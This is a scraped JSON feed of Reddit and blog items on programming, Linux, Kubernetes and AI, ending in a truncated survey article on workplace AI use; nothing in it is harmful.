href=\"https://www.reddit.com/r/programming/comments/1mufl1a/prime_number_grid/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"[Media] Creating terminal UI games in Rust with Ratatui is incredibly fun! WezTerm Powermonger Remake","url":"https://www.reddit.com/r/rust/comments/1mufils/media_creating_terminal_ui_games_in_rust_with/","date":1755602207,"author":"/u/Big_Membership9737","guid":233381,"unread":true,"content":"<p>I loved Powermonger as a kid, so I’m building a similar game in Rust with Ratatui. My first attempt used Unicode, which caused a lot of issues, but I’m still really enjoying the art style and how straightforward game development feels with Rust and Ratatui.</p>","contentLength":261,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"JSON.stringify got faster","url":"https://www.reddit.com/r/programming/comments/1mueqcy/jsonstringify_got_faster/","date":1755599710,"author":"/u/Maybe-monad","guid":233288,"unread":true,"content":"&#32; submitted by &#32; <a href=\"https://www.reddit.com/user/Maybe-monad\"> /u/Maybe-monad </a> <br/> <span><a href=\"https://v8.dev/blog/json-stringify\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/programming/comments/1mueqcy/jsonstringify_got_faster/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"[D] Endorsement for cs.LG at arXiv as non-ML student?","url":"https://www.reddit.com/r/MachineLearning/comments/1mudtw6/d_endorsement_for_cslg_at_arxiv_as_nonml_student/","date":1755596540,"author":"/u/FammasMaz","guid":233220,"unread":true,"content":"<p>Hello, I plan on publishing a paper in ML (diffusion models for a mechanics system) and a preprint on arXiv, however, all my colleagues and friends are in Mechanics or Physics. What could be my options in this case. I can't find a person in cs.LG for a long time?</p><p>The general idea is to make an ML based pipeline to generate granular mechanical structures.</p>","contentLength":355,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Recruiters are in trouble. In a large experiment with 70,000 applications, AI agents outperformed human recruiters in hiring customer service reps.","url":"https://www.reddit.com/r/artificial/comments/1mudpr4/recruiters_are_in_trouble_in_a_large_experiment/","date":1755596115,"author":"/u/MetaKnowing","guid":233289,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Kevin Roose says an OpenAI researcher got many DMs from people asking him to bring back GPT-4o - but the DMs were written by GPT-4o itself. 4o users revolted and forced OpenAI to bring it back. This is spooky because in a few years powerful AIs may truly persuade humans to fight for their survival.","url":"https://v.redd.it/apep96i83yjf1","date":1755595663,"author":"/u/MetaKnowing","guid":233441,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/artificial/comments/1mudlge/kevin_roose_says_an_openai_researcher_got_many/"},{"title":"Build beautiful CLI apps in Go (Tutorial)","url":"https://youtu.be/KaRv8veSdHU?si=piSJHlscxy5_IjJ4","date":1755595229,"author":"/u/siggy_star","guid":233221,"unread":true,"content":"<!DOCTYPE html>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/golang/comments/1mudhd9/build_beautiful_cli_apps_in_go_tutorial/"},{"title":"LoxiLB -- More than MetalLB","url":"https://oilbeater.com/en/2025/08/15/loxilb/","date":1755594008,"author":"/u/oilbeater","guid":233218,"unread":true,"content":"<p><a target=\"_blank\" rel=\"noopener\" href=\"https://github.com/metallb/metallb\">MetalLB</a> has become the de facto standard for providing LoadBalancer-type Services in private cloud Kubernetes environments. Its implementation is straightforward and focused, with a gossip-based distributed leader election ensuring quick VIP failover independent of Kubernetes’ state. However, this specialization also means it lacks some critical production-ready features, which led me to explore alternatives like <a target=\"_blank\" rel=\"noopener\" href=\"https://github.com/loxilb-io/loxilb\">LoxiLB</a>.</p><p>Despite its name, MetalLB doesn’t handle any data plane forwarding. Strictly speaking, it only provides VIP advertisement capabilities, relying entirely on kube-proxy or its alternatives for forwarding. While this allows MetalLB to focus on various VIP advertisement methods and maintain maximum compatibility with Kubernetes, it also inherits kube-proxy’s functional limitations.</p><h3>Lack of Active Health Checks</h3><p>This is a long-standing Kubernetes issue. Service endpoint health depends on Pod ReadinessProbe/LivenessProbe, which require the node’s kubelet to function. During power failures or kernel crashes, kubelet can’t update Pod status until node-not-ready timeout occurs (often minutes in large clusters), causing service access failures during this window.</p><p>While not strictly MetalLB’s fault, its inability to actively probe Pod health or modify status leaves it vulnerable to this mechanism. Though <a target=\"_blank\" rel=\"noopener\" href=\"https://kubernetes.io/docs/concepts/workloads/pods/pod-lifecycle/#pod-readiness-gate\">Pod ReadinessGates</a> allow external controllers to manage health status, MetalLB offers no out-of-the-box solution, creating production environment risks.</p><p>Another kube-proxy limitation. Most kube-proxy implementations lack traffic-level monitoring, meaning MetalLB’s <a target=\"_blank\" rel=\"noopener\" href=\"https://metallb.universe.tf/prometheus-metrics/\">metrics</a> contain no traffic data. Deploying an LB with virtually no data plane monitoring in production seems overly optimistic.</p><p>LoxiLB is an eBPF-based LB designed for telecom scenarios, implementing both control and data planes as a complete LB solution. While packed with features (especially for SCTP), we’ll focus on how it addresses MetalLB’s gaps.</p><p>LoxiLB supports <a target=\"_blank\" rel=\"noopener\" href=\"https://docs.loxilb.io/latest/cmd/#create-end-point-for-health-probing\">configurable health checks</a> per Service, including ping, TCP, UDP, SCTP, HTTP, HTTPS with timeout/retry settings. While not revolutionary, MetalLB’s complete lack of this functionality makes LoxiLB’s offering notable.</p><p>Here eBPF shines. LoxiLB includes built-in <a target=\"_blank\" rel=\"noopener\" href=\"https://docs.loxilb.io/latest/loxilb-incluster-grafana/\">Metrics and Grafana dashboards</a>, and its self-contained data plane makes adding custom metrics relatively straightforward.</p><p>While LoxiLB is impressive (its SCTP implementations helped me understand the protocol better), some areas need attention:</p><ul><li>Leader election still uses Kubernetes’ native mechanism, unlike MetalLB’s decoupled approach.</li><li>Documentation, though extensive, is disorganized—many configurations require searching, and some formatting issues exist.</li><li>As a CNCF sandbox project, its community activity remains limited. While clearly mature internally, low adoption could pose future risks.</li></ul><p>MetalLB remains excellent at VIP advertisement and high availability, but requires additional components for production readiness. LoxiLB offers a complete LB solution, though its community is still developing and needs broader participation.</p>","contentLength":3082,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/kubernetes/comments/1mud604/loxilb_more_than_metallb/"},{"title":"Managing Multi-Tenant Schemas in Go Without Opening Too Many Connections","url":"https://www.reddit.com/r/golang/comments/1mucpol/managing_multitenant_schemas_in_go_without/","date":1755592249,"author":"/u/ScientistPositive568","guid":233388,"unread":true,"content":"<p>I’m working on a multi-tenant app where I use a  but create <strong>separate schemas for each tenant</strong> so that their data stays isolated.</p><p>Right now, my approach is to keep a  where each tenant gets its own connection pool. This works, but it blows up quickly because every new tenant ends up creating a whole new pool, and eventually I run into connection limits.</p><p>My question: Is there a way to <strong>connect to the right schema on the fly</strong> using the standard  package in Go, without maintaining separate pools per tenant?</p>","contentLength":505,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Wireguard and wg-easy helm charts - with good values","url":"https://www.reddit.com/r/kubernetes/comments/1mucf04/wireguard_and_wgeasy_helm_charts_with_good_values/","date":1755591100,"author":"/u/CopyOf-Specialist","guid":233242,"unread":true,"content":"<p>Hey! I started with Kubernetes and looked for good helm charts for wireguard but didn't find any good. So I published 2 charts by myself.</p><ul><li>Every env variable is supported</li><li>In the wireguard chart server mode AND client mode is supported</li><li>wg-easy chart supports init mode for a unattended setup</li><li>wg-easy chart can create a service monitor for prometheus</li></ul><p>If you have any suggestions for improvement, write a comment.</p>","contentLength":404,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Study of 281 MCP plugins: 72% expose high-privilege actions; 1 in 10 fully exploitable","url":"https://www.reddit.com/r/programming/comments/1mubl8b/study_of_281_mcp_plugins_72_expose_highprivilege/","date":1755587977,"author":"/u/tapmylap","guid":233196,"unread":true,"content":"&#32; submitted by &#32; <a href=\"https://www.reddit.com/user/tapmylap\"> /u/tapmylap </a> <br/> <span><a href=\"https://www.pynt.io/blog/llm-security-blogs/state-of-mcp-security\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/programming/comments/1mubl8b/study_of_281_mcp_plugins_72_expose_highprivilege/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Terminal sessions you can bookmark: Building Zellij’s web client","url":"https://www.reddit.com/r/programming/comments/1mubc0y/terminal_sessions_you_can_bookmark_building/","date":1755587040,"author":"/u/imsnif","guid":233337,"unread":true,"content":"&#32; submitted by &#32; <a href=\"https://www.reddit.com/user/imsnif\"> /u/imsnif </a> <br/> <span><a href=\"https://poor.dev/blog/building-zellij-web-terminal/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/programming/comments/1mubc0y/terminal_sessions_you_can_bookmark_building/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Computer Science Graduates Face Worst Job Market in Decades","url":"https://www.reddit.com/r/programming/comments/1muap7s/computer_science_graduates_face_worst_job_market/","date":1755584768,"author":"/u/Infamous_Toe_7759","guid":233180,"unread":true,"content":"&#32; submitted by &#32; <a href=\"https://www.reddit.com/user/Infamous_Toe_7759\"> /u/Infamous_Toe_7759 </a> <br/> <span><a href=\"https://www.finalroundai.com/blog/computer-science-graduates-face-worst-job-market-in-decades\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/programming/comments/1muap7s/computer_science_graduates_face_worst_job_market/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Why do you use your distro?","url":"https://www.reddit.com/r/linux/comments/1mu97jp/why_do_you_use_your_distro/","date":1755579596,"author":"/u/DefinitelyChriss","guid":233386,"unread":true,"content":"<p>Ive been using linux for almost a year now. Ive tried many different distros, Ranging from Fedora. Mint. Arch, CachyOS. Lubuntu. and more.</p><p>And after trying all of these distros. i eventually settled on mint just because it seemed to be the most streamlined.</p><p>But ive thought a lot. Why do you even bother with other distros? the only thing i notice are the difference in package managers. Obviously theres a difference in Desktop Environments. But thats different. Why would you use Ubuntu with KDE instead of Fedora with KDE. Because i really wouldnt notice the difference.</p>","contentLength":571,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"A simple \"Dotfiles Manager\" For Work-Related Notes","url":"https://www.reddit.com/r/programming/comments/1mu5h9i/a_simple_dotfiles_manager_for_workrelated_notes/","date":1755568532,"author":"/u/deepCelibateValue","guid":231867,"unread":true,"content":"&#32; submitted by &#32; <a href=\"https://www.reddit.com/user/deepCelibateValue\"> /u/deepCelibateValue </a> <br/> <span><a href=\"https://github.com/sebastiancarlos/work-notes\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/programming/comments/1mu5h9i/a_simple_dotfiles_manager_for_workrelated_notes/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Whatsapp client written purely in Rust based on whatsmeow and baileys","url":"https://github.com/jlucaso1/whatsapp-rust","date":1755566980,"author":"/u/jlucaso1","guid":233243,"unread":true,"content":"<div><p>You can create high perfomance bots. In my tests in the release mode only 9mb of RAM are used and the binary size is about 4-5mb.</p></div>   submitted by   <a href=\"https://www.reddit.com/user/jlucaso1\"> /u/jlucaso1 </a>","contentLength":160,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/rust/comments/1mu4w60/whatsapp_client_written_purely_in_rust_based_on/"},{"title":"TIL that `curl` 8.14.0 and later includes a `wget` replacement called `wcurl`","url":"https://www.reddit.com/r/linux/comments/1mu43mn/til_that_curl_8140_and_later_includes_a_wget/","date":1755564812,"author":"/u/lmm7425","guid":233182,"unread":true,"content":"<div><pre><code>wget https://mirrors.rit.edu/ubuntu-releases/24.04.3/ubuntu-24.04.3-desktop-amd64.iso </code></pre><pre><code>wcurl https://mirrors.rit.edu/ubuntu-releases/24.04.3/ubuntu-24.04.3-desktop-amd64.iso </code></pre></div>   submitted by   <a href=\"https://www.reddit.com/user/lmm7425\"> /u/lmm7425 </a>","contentLength":203,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Open source model quantization library achieving 4x compression - looking for contributors","url":"https://www.reddit.com/r/programming/comments/1mu3ump/open_source_model_quantization_library_achieving/","date":1755564130,"author":"/u/Silver_Raspberry_811","guid":231879,"unread":true,"content":"<!-- SC_OFF --><div class=\"md\"><p><strong>Project</strong>: Neural quantization library with novel cascade approach</p> <p><strong>Problem Statement</strong>: Current model quantization tools either:</p> <ul> <li>Sacrifice too much accuracy (unusable results)</li> <li>Are proprietary/expensive (vendor lock-in)</li> <li>Don&#39;t handle multiple languages well (English bias)</li> <li>Require specialized hardware (accessibility barrier)</li> </ul> <p><strong>Technical Solution</strong>: Implemented a cascade quantization pipeline that prevents the &quot;quantization cliff&quot; problem: Traditional: FP16 -----&gt; INT4 (massive precision drop = performance cliff) Cascade: FP16 -&gt; INT8 -&gt; INT4 (gradual reduction = preserved performance)</p> <p><strong>Architecture Overview</strong>:</p> <ul> <li><strong>Stage 1</strong>: FP16→INT8 with language-agnostic calibration</li> <li><strong>Stage 2</strong>: INT8→INT4 with error compensation</li> <li><strong>Optimization</strong>: bf16 training pipeline integration</li> <li><strong>Deployment</strong>: Edge-optimized inference kernels</li> </ul> <p><strong>Performance Metrics</strong>:</p> <ul> <li>Compression: 4.2× (target: &gt;3.5×) ✅</li> <li>Accuracy retention: 98.2% (target: &gt;98%) ✅</li> <li>Inference speedup: 3.2× ✅</li> <li>Cross-lingual validation: 13/15 languages successful ✅</li> <li>Memory footprint: Jetson Nano compatible ✅</li> </ul> <p><strong>Tech Stack &amp; Dependencies</strong>:</p> <ul> <li>Core: Python 3.8+, PyTorch, NumPy</li> <li>Optimization: Triton kernels, CUDA support</li> <li>Target: GPTQ integration, Marlin kernel optimization</li> <li>Testing: Comprehensive multi-language evaluation suite</li> </ul> <p><strong>Current Implementation Status</strong>: ✅ Research prototype (validated approach) ✅ Demonstration pipeline (all metrics achieved) 🚧 Production core (GPTQ algorithms) 🚧 Kernel optimization (Marlin/Triton) 🚧 Multi-model support 🚧 Package distribution &amp; CI/CD</p> <p><strong>Contribution Opportunities</strong>:</p> <ol> <li><strong>Core Algorithm</strong>: GPTQ implementation, optimization mathematics</li> <li><strong>Performance</strong>: Kernel optimization, memory management</li> <li><strong>Compatibility</strong>: Additional model architectures, framework support</li> <li><strong>Testing</strong>: Hardware validation, benchmark suites</li> <li><strong>DevOps</strong>: CI/CD, packaging, documentation</li> </ol> <p><strong>Code Quality Standards</strong>:</p> <ul> <li>Type hints, comprehensive docstrings</li> <li>Unit tests with &gt;90% coverage</li> <li>Performance benchmarking suite</li> <li>Memory profiling integration</li> <li>Clear separation of research/production code</li> </ul> <p><strong>Why Contribute</strong>:</p> <ul> <li>Impact: Democratize efficient AI deployment globally</li> <li>Learning: Deep dive into quantization, optimization, numerical computing</li> <li>Community: Work with researchers and engineers worldwide</li> <li>Portfolio: Open-source ML infrastructure experience</li> </ul> <p><strong>Getting Started</strong>: Repository includes detailed setup instructions, architecture docs, and issues tagged by experience level. Happy to mentor new contributors.</p> <p><strong>Discussion Points</strong>:</p> <ol> <li>Which model architectures should we prioritize?</li> <li>What deployment scenarios are most critical?</li> <li>How can we optimize the developer experience?</li> <li>What testing strategies would catch edge cases?</li> </ol> <p>The mathematical foundation is solid, now we need engineering excellence to make it production-ready. Interested in building the future of efficient AI deployment?</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/Silver_Raspberry_811\"> /u/Silver_Raspberry_811 </a> <br/> <span><a href=\"https://github.com/Yash2378/neural-quantization\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/programming/comments/1mu3ump/open_source_model_quantization_library_achieving/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Handling Mouse and Touchscreen Input Using Ebitengine (Tutorial)","url":"https://www.youtube.com/watch?v=GHsjG0hz9_Q","date":1755560513,"author":"/u/tslocum","guid":233198,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/golang/comments/1mu2g9z/handling_mouse_and_touchscreen_input_using/"},{"title":"[D] Beyond the cloud: SLMs, local AI, agentic constellations, biology and a high value direction for AI progress","url":"https://www.reddit.com/r/MachineLearning/comments/1mu2a8x/d_beyond_the_cloud_slms_local_ai_agentic/","date":1755560085,"author":"/u/AntreasAntoniou","guid":233384,"unread":true,"content":"<p>I’m here today to share a thought on a different direction for AI development. While the field chases multi-trillion parameter models, I believe an extremely valuable endeavour lies in the power of constraints: pushing ourselves to get models under 1 billion parameters to excel.</p><p>In my new blog post, I argue that this constraint is a feature, not a bug. It removes the \"scale-up cheat code\" and forces us to innovate on fundamental algorithms and architectures. This path allows for faster experimentation, where architectural changes are no longer a risk but a necessity for improvement.</p><p>The fear that 'scale will wash away any and all gains' is real, but let's remember: an MLP could never compete with a Transformer, no matter how much it was scaled up. My post explores the question: <strong>what if our current Transformer is the MLP of something better that is within grasp but ignored because of our obsession with scale?</strong></p><p>Your feedback and thoughts would be greatly appreciated.</p>","contentLength":977,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"How do I provision a \"copy-on-write\" volume without making a full copy on disk?","url":"https://www.reddit.com/r/kubernetes/comments/1mu29xj/how_do_i_provision_a_copyonwrite_volume_without/","date":1755560062,"author":"/u/I_Give_Fake_Answers","guid":233153,"unread":true,"content":"<p>Copy-on-write inherently means there is no copy of the source (I think), so perhaps the title is dumb.</p><p>I'm currently using LongHorn, though I'm open to switching if there's a limitation with it. Nothing I've done has managed to provision a volume without making a full copy from the source. Maybe I'm fundamentally misunderstanding something.</p><p>Using VolumeSnapshot as a source, for example:</p><pre><code>apiVersion: v1 kind: PersistentVolumeClaim metadata: name: snapshot-pvc spec: accessModes: - ReadWriteOnce storageClassName: longhorn resources: requests: storage: 200Gi dataSource: name: volume-20250816214424 kind: VolumeSnapshot apiGroup: snapshot.storage.k8s.io </code></pre><p>It makes a full 200Gi (little less, technically) copy from the source.</p><p>(I first tried \"dataSourceRef\" as I needed cross-namespace volume ref, but I'm simplifying it now just to get it working)</p><p>I'm wanting to have multiple volumes referencing the same blocks on disk without copying. I won't be doing significant writes, but I will be writing, so it can't be read-only.</p>","contentLength":1018,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"[D] Too much of a good thing: how chasing scale is stifling AI innovation","url":"https://www.reddit.com/r/MachineLearning/comments/1mu28xl/d_too_much_of_a_good_thing_how_chasing_scale_is/","date":1755559990,"author":"/u/AntreasAntoniou","guid":233164,"unread":true,"content":"<p>Hello everyone! I hope you are all doing well out there.</p><p>I've been observing a pattern in the AI research field that I can only describe as a \"Mass Amnesia.\" It seems we're forgetting the valuable research paths we were on before the ChatGPT moment.</p><p>In my latest blog post, I argue that while scaling up LLMs was initially a courageous endeavour, the current obsession and monoculture around it is actively keeping us stuck. Instead of building on a diverse set of ideas, we're chasing a single approach, which I believe is making us amnesiacs about what came before and what's possible.</p><p>I'd love for you to read my spicy takes and share your own. Let's tear my arguments and ideas apart. ;)</p><p>I look forward to your arguments and thoughts.</p>","contentLength":734,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"After playing around with BubbleTea I want to really like it but ELM TUI apps get fairly hard to maintain and reason about as they grow","url":"https://www.reddit.com/r/golang/comments/1mu0xrl/after_playing_around_with_bubbletea_i_want_to/","date":1755556678,"author":"/u/wait-a-minut","guid":231827,"unread":true,"content":"<p>Been working on a TUI project and although I've used Bubbletea in the past, It wasn't as complex as this one. </p><p>I just found it hard to really reason around state management across tabs and sub windows. </p>","contentLength":201,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"why isn't fedora recommended for beginners?","url":"https://www.reddit.com/r/linux/comments/1mu0ul2/why_isnt_fedora_recommended_for_beginners/","date":1755556456,"author":"/u/Zery12","guid":233312,"unread":true,"content":"<p>Installing nvidia drivers is pretty easy (only on workstation though), just enable 3rd party repos and search for nvidia on gnome software</p><p>codecs is still an issue, but way less than before, cuz it's mainly a flatpak distro nowadays</p><p>you can do major updates (like 42 to 43) with gnome software, no need for terminal</p><p>it have great bleeding edge hardware support</p><p>so why it's still barely recommended? </p>","contentLength":395,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Kube-coder: spin up multi-dev isolated environments in kubernetes accessible through custom domains.","url":"https://github.com/imran31415/kube-coder","date":1755553978,"author":"/u/Crafty_Disk_7026","guid":231825,"unread":true,"content":"<p>Hey all I wanted to have isolated dev environments for multiple users that I can spin up ephemerally. Created this helm chart combining open source software to achieve this. Now I can go to myname.myurl and access a vscode environment customized to my liking with Claude installed. </p><p>Included only the basics as it's fairly easy to extend for your needs. Plz give a star if you think it's cool :) </p>","contentLength":395,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/kubernetes/comments/1mtzsgf/kubecoder_spin_up_multidev_isolated_environments/"},{"title":"A new Music Player for Linux?","url":"https://www.reddit.com/r/linux/comments/1mtyr72/a_new_music_player_for_linux/","date":1755551620,"author":"/u/Thanatermesis","guid":233338,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Learning Cilium","url":"https://www.reddit.com/r/kubernetes/comments/1mtybib/learning_cilium/","date":1755550660,"author":"/u/HandyMan__18","guid":233179,"unread":true,"content":"<p>Hi guys, I am a software engineer and I'm learning cilium through isovalent labs. I document the labs and understand what's going on but when i try to implement the same thing on my own minikube cluster, i get blanked off. Are there any good recourses to learn about cilium and it's usage because I can't seem to understand it's documentation.</p>","contentLength":343,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Linux for a normie (me)","url":"https://www.reddit.com/r/linux/comments/1mtxne5/linux_for_a_normie_me/","date":1755549160,"author":"/u/Key_Examination4892","guid":233154,"unread":true,"content":"<p>TLDR: can't code, love Linux </p><p>I'm not computer literate at all and have the most experience with really old versions of Windows. Got Linux, Ubuntu distro. Don't get kernels, don't get servers don't even know what anything means when I go to investigate the Linux user side of the web. I must confess I also barely use the terminal because I use the laptop for spreadsheets and archiving mostly. </p><p>However, I really like it. Smooth, simple, etc etc. One of the many perks for me is that my laptop hasn't been glitchy or slow since I got it and some of the weird noises stopped! Thanks chat. </p><p>Room temperature IQ rating of Linux: 8/10</p>","contentLength":628,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Imagine paying for the tools that make your boss richer... welcome to the AI workplace","url":"https://explodingtopics.com/blog/ai-workforce-research","date":1755548354,"author":"/u/kpness","guid":233480,"unread":true,"content":"<p>In an exclusive survey, Exploding Topics found that 29% pay for their own AI tools at work, often without their bosses’ knowledge. And most receive little to no training.</p><p>Our survey of more than 1,000 AI users reveals a workplace rushing to adopt AI, but failing to properly support it. There’s a shadow army of AI-powered employees working without oversight, and in many cases, without permission.</p><p>We found a <strong>massive embrace of AI, both at home and at work</strong>.</p><p>But amid skyrocketing usage, we also found , a <strong>significant age and wealth divide, </strong>and a <strong>general lack of workplace training</strong> — as well as <strong>widespread, potentially unauthorized use of personal AI tools in a professional capacity.</strong></p><p>The research also uncovers sharp divides in AI comfort, trust, and usage, and even some surprising personal use cases, from therapy sessions to relationship advice.</p><ul><li>35.49% of AI users use the tools every day</li><li> 29% pay for their own AI tools at work</li><li>Half (50.11%) get little or no training from employers</li><li> 34.48% have asked AI for personal or relationship advice</li><li> only 20.26% are uneasy about sharing personal info with AI</li><li>79.67% report higher output thanks to AI</li><li>Only 9.78% have no concerns about AI at work.</li><li>High earners are more than twice as likely to fear AI replacing them</li><li>91.85% say their work AI experience is at least somewhat positive</li></ul><div><h3>Download the AI Workforce Report</h3><p>Get full results plus <strong>key takeaways for marketers</strong> and expert insights</p><a href=\"https://drive.google.com/file/d/1qod--SPGzMIZx0pyG0PaqrhI6gKksO6E/view\" target=\"_blank\" rel=\"noopener noreferrer\">Download Report</a></div><h3>A significant minority resist AI entirely</h3><p>The majority of our survey was carried out among people who reported using AI at home or at work. But to find this 1003-strong group, we first had to ask a filter question.</p><p>This produced our core group of survey respondents. But it also provided its own insight.</p><p><strong>20.06% of people still report not using AI at all, either in a personal or professional capacity. </strong></p><p>A further 4.58% were unsure if they had ever used AI.</p><p>That still means <strong>more than three-quarters of people are now using AI to some extent. </strong>But it is not yet entirely ubiquitous.</p><p>The rest of our survey focused on the people who do use AI.</p><p><strong>And people who use AI are now using it very regularly: every day in many cases. </strong></p><p>To be precise, 35.49% of respondents are using AI every day. A further 39.38% of people are using it “a few times a week”.</p><p><strong>All in all, 84.84% of AI users are using it at least once a week.</strong></p><p>And only a tiny percentage (1%) use AI exclusively at work, with no personal usage whatsoever.</p><p>The use of AI has increased steeply in the past year.</p><p><strong>84.58% of users have increased their AI usage in the past 12 months. </strong></p><p>48.49% of people say they are using AI “a lot more”, while 36.09% report a slight increase.</p><p>Only 3.13% have reduced their AI usage in the past 12 months, while just 0.71% use it “much less” than they did 12 months ago.</p><p><strong>Use of AI has increased most markedly among the highest earners.</strong></p><p>72.84% of respondents with a household income of over $200,000 now use AI “much more” than they did a year ago. A further 20.99% use it “slightly more”, and only 1.23% have decreased their usage.</p><p>Nobody with a household income higher than $99,999 reports using AI “much less” than they did 12 months ago.</p><p>ChatGPT has earned a dominant position in the home. Among those who use AI tools, </p><p>Google’s <a href=\"https://explodingtopics.com/blog/ai-search-engines\">AI Mode</a> has earned the next-most traction among personal users. 41.13% of AI users are now using this AI-first search tool.</p><p>Gemini, Meta, and Copilot (in Windows/Microsoft products) are the next-most-popular home AI tools. <a href=\"https://explodingtopics.com/blog/deepseek-vs-chatgpt\">DeepSeek</a> rounds out the top six, with marginally more popularity than Claude.</p><h4><strong>Grok Usage Shows Sharp Gender Divide</strong></h4><h3>The (highly) personal uses of AI</h3><p><strong>Nearly 1 in 4 users turn to AI for therapy or counseling, according to our survey. That’s despite the CEO of OpenAI saying the idea makes him uneasy.</strong></p><p>In our survey, 37.1% of respondents also said they use it for health and wellness advice.</p><p>This health focus mirrors recent messaging from OpenAI. During the recent GPT-5 launch, <a href=\"https://www.fiercehealthcare.com/ai-and-machine-learning/altman-touts-benefit-gpt-5-healthcare\">CEO Sam Altman said</a> that the model “empowers you to be more in control of your healthcare journey.”</p><p>42.4% of respondents say that they have used AI at home for financial planning or budgeting. In fact, finances are the area most people would choose if AI could solve just one problem in their life.</p><p><strong>And more than 1 in 3 (34.48%) have used AI for help with relationship or personal problems.</strong></p><p>Men (37.28%) are more likely than women (31.58%) to turn to AI for relationship or personal advice.</p><p>And almost half (46.97%) of respondents in the Mid-Atlantic have used AI for this kind of guidance. Take-up is lowest in the Mountain region (20.34%).</p><p>Two use cases have been adopted by more than 50% of all AI users: question-answering/ research, and creating/ editing text.</p><p><strong>63.31% of respondents use AI to conduct research or get answers to questions</strong>. In that sense, it is being used more or less like a search engine.</p><p>Meanwhile, <strong>52.02% of respondents use AI to create/edit text. </strong></p><p>Other popular uses include entertainment and learning new skills.</p><h4><strong>Deeply personal use cases, but limited privacy concerns</strong></h4><p>Users are clearly sharing sensitive information with AI, but they are generally not worried about privacy.</p><p><strong>Just 7.56% of AI users say that they avoid sharing personal information with AI tools altogether. Only another 12.7% say they are “somewhat uncomfortable” doing so. </strong></p><p>Meanwhile, more than half of users (56.36%) are either “very” or “somewhat” comfortable sharing personal information. Almost 1 in 4 are neutral, saying that it depends on the situation.</p><p>Among those using AI for therapy or counselling, only 4.29% are even “somewhat” uncomfortable about sharing their personal information.</p><p><strong>The 18-29 age group is the least comfortable sharing personal information with AI tools. </strong></p><p>Only 13.89% of young people are “very comfortable” doing so, compared to more than 31% of AI users aged 30-44. And more than a quarter are at least “somewhat uncomfortable”.</p><p>Richer respondents are also more likely to be comfortable sharing their information with AI tools. 50.62% of the highest earners say they are “very comfortable” doing so.</p><p><strong>Meanwhile, women are more concerned than men about sharing their personal information with AI. </strong></p><p>Less than half of female AI users (49.47%) are at least “somewhat” comfortable sharing their personal information with AI tools. 62.72% of men are comfortable sharing the same data.</p><h3>AI more popular at home than at work</h3><p>The vast majority (&gt;99%) of people who use AI at work also use it at home. But the inverse is not true.</p><p><strong>15.57% of AI users do not use the technology at work. </strong></p><p>Among this group of work AI abstainers, 44.9% don’t use it because of company policy. 55.1% make a choice not to use AI at work.</p><p>Women (11%) are more likely than men (6.2%) to consciously opt out of using AI at work.</p><p><strong>Employees aged 18-29 are also statistically more likely to avoid using AI in the office. </strong></p><p>15.74% of workers in this age group who use AI at home nonetheless actively elect not to use the technology at work. That’s compared to just 8.58% of AI users across all age groups.</p><h4><strong>Concerns about AI at work</strong></h4><p>Some common fears about using AI at work are present among both users and non-users.</p><p>Only 9.78% of all respondents had no concerns at all about using AI at work.</p><p><strong>In stark contrast to the lack of fear about sharing personal information, 48.8% of workplace AI users cite privacy and security as a concern.</strong></p><p>The next-biggest fear among workers is that AI may make them look replaceable, a concern shared by 43.31% of respondents. Worries about quality and accuracy (42.12%) complete the top three.</p><p><strong>Fascinatingly, the highest earners are the most worried about being made to look replaceable. 55.56% of respondents with a household income above $200,000 cited this as a concern about AI at work.</strong></p><p>By comparison, among workers with a household income of $25,000-$49,999, only 26.67% were worried that AI would make them seem replaceable.</p><h3>Will AI Take Your Job? We Asked An 